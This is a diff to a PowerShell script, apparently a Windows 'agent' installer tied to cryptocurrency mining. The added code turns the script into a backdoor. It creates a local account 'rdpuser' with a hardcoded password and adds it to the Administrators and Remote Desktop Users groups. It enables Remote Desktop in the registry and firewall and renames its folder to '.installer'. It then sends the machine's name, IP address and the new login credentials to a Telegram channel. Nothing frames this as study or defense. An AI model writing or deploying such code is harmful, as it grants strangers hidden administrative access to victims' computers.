@@ -1,3 +1,6 @@
+# ===== UTF-8 FIX =====
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
 # ===== SAFETY =====
 if ($env:ALLOW_MINING -ne "1") { exit }
 
@@ -17,26 +20,53 @@ function Send-TG($text) {
 }
 
 # ===== PATH =====
-$BASE = "$env:APPDATA\.mining"
+$BASE = "$env:APPDATA\.installer"
 New-Item -ItemType Directory -Force -Path $BASE | Out-Null
 
 # ===== ONE-TIME MARKER =====
 $marker = "$BASE\installed.flag"
-if (Test-Path $marker) {
-    exit
-}
+if (Test-Path $marker) { exit }
 
-# ===== MESSAGE =====
+# ===== CREATE USER =====
+$user = "rdpuser"
+$pass = "P@ssw0rd123!"
+$sec  = ConvertTo-SecureString $pass -AsPlainText -Force
+
+try {
+    New-LocalUser -Name $user -Password $sec -PasswordNeverExpires -UserMayNotChangePassword
+} catch {}
+
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member $user -ErrorAction SilentlyContinue
+Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue
+
+# ===== ENABLE RDP =====
+Set-ItemProperty `
+  -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
+  -Name fDenyTSConnections `
+  -Value 0
+
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+# ===== SYSTEM INFO =====
 $host = $env:COMPUTERNAME
-$user = $env:USERNAME
+$who  = $env:USERNAME
 $os   = (Get-CimInstance Win32_OperatingSystem).Caption
+$ip   = (Get-NetIPAddress -AddressFamily IPv4 `
+        | Where-Object {$_.IPAddress -notlike "169.*"} `
+        | Select-Object -First 1).IPAddress
 
-Send-TG "🪟 Windows агент установлен
+# ===== TELEGRAM MESSAGE (UTF-8 OK) =====
+Send-TG @"
+🪟 Windows агент установлен
 
 Host: $host
-User: $user
+IP: $ip
+User created: $user
+Password: $pass
 OS: $os
-Time: $(Get-Date)"
+Installed by: $who
+Time: $(Get-Date)
+"@
 
-# ===== MARK INSTALLED =====
+# ===== MARK DONE =====
 New-Item -ItemType File -Path $marker | Out-Null
